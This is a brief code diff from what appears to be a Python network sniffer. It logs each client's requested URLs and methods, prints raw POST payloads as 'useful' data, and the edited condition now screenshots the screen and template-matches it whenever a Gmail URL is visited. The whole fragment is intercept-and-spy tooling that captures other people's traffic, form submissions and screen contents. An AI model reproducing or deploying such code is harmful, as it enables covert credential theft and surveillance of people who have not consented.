@@ -18,7 +18,7 @@ def process_packet(packet):
         print(f"\n[+] {ip} Requested {url} with {method}")
         if ppacket.haslayer(Raw) and method == "POST":
             print(f"\n[*] Some useful Raw data: {ppacket[Raw].load}")
-        if url == 'mail.google.com':
+        if 'mail.google.com' in url:
             img_rgb = ImageGrab.grab()
             img_gray = cv2.cvtColor(img_rgb, cv2.COLOR_BGR2GRAY)
             template = cv2.imread('gmail.png',0)
